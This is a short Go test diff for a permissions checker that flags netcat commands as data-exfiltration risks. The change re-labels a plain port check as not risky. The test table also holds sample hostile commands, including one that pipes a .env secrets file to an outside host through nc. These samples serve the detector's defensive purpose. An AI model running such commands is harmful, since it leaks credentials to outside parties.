@@ -767,7 +767,7 @@ func TestPermissions_IsExfiltrationRiskNetcat(t *testing.T) {
 		command string
 		want    bool
 	}{
-		{"nc_basic", "nc -zv example.com 443", true},
+		{"nc_basic", "nc -zv example.com 443", false},
 		{"ncat_basic", "ncat example.com 80", true},
 		{"nc_with_data", "nc example.com 443 < .env", true},
 		{"nc_no_args", "nc", false},
